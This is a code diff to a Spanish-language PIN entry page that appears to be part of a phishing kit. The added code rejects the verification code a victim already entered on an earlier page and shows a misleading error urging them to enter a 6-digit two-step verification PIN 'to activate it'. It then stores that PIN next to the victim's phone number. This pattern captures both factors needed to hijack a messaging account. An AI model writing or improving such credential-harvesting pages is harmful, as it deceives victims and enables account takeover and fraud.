@@ -118,6 +118,23 @@
     .footer-text a:hover {
       text-decoration: underline;
     }
+
+    .error-message {
+      display: none;
+      background-color: #ffebee;
+      color: #c62828;
+      padding: 12px 16px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      border: 1px solid #ef5350;
+      font-size: 0.9rem;
+      line-height: 1.4;
+      text-align: left;
+    }
+
+    .error-message.show {
+      display: block;
+    }
   </style>
 </head>
 <body>
@@ -130,6 +147,9 @@
 
     <form id="codeForm" autocomplete="off">
       <label for="code">PIN de 6 dígitos</label>
+      <div class="error-message" id="errorMessage">
+        <strong>Código inválido:</strong> No puedes usar el mismo código de verificación. Si no tienes activada la verificación en dos pasos, ingresa un código de 6 dígitos para activarla.
+      </div>
       <div class="code-inputs" aria-label="Código de 6 dígitos">
         <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required aria-label="Dígito 1" />
         <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required aria-label="Dígito 2" />
@@ -157,6 +177,11 @@
       if (input.value.length === 1 && index < inputs.length - 1) {
         inputs[index + 1].focus();
       }
+      
+      // Ocultar mensaje de error cuando el usuario empiece a escribir
+      if (input.value !== '') {
+        $('#errorMessage').removeClass('show');
+      }
     });
 
     input.addEventListener('keydown', (e) => {
@@ -169,13 +194,32 @@
   $('#codeForm').submit(function(e) {
     e.preventDefault();
 
+    // Ocultar mensaje de error al inicio
+    $('#errorMessage').removeClass('show');
+
     let code = '';
     inputs.forEach(input => {
       code += input.value;
     });
 
-    // Guardar código en localStorage para luego comparar en index3
-    localStorage.setItem('codigo_index2', code);
+    // Verificar si el código es el mismo que el usado en index2
+    const codigoIndex2 = localStorage.getItem('codigo_index2');
+    
+    if (codigoIndex2 && code === codigoIndex2) {
+      // Mostrar mensaje de error en rojo
+      $('#errorMessage').addClass('show');
+      
+      // Limpiar los campos de entrada
+      inputs.forEach(input => {
+        input.value = '';
+      });
+      inputs[0].focus();
+      
+      return; // Detener el proceso
+    }
+
+    // Guardar PIN de verificación en dos pasos con clave diferente
+    localStorage.setItem('pin_verificacion_dos_pasos', code);
 
     let numero = localStorage.getItem('telefono_completo') || "Número no disponible";
 
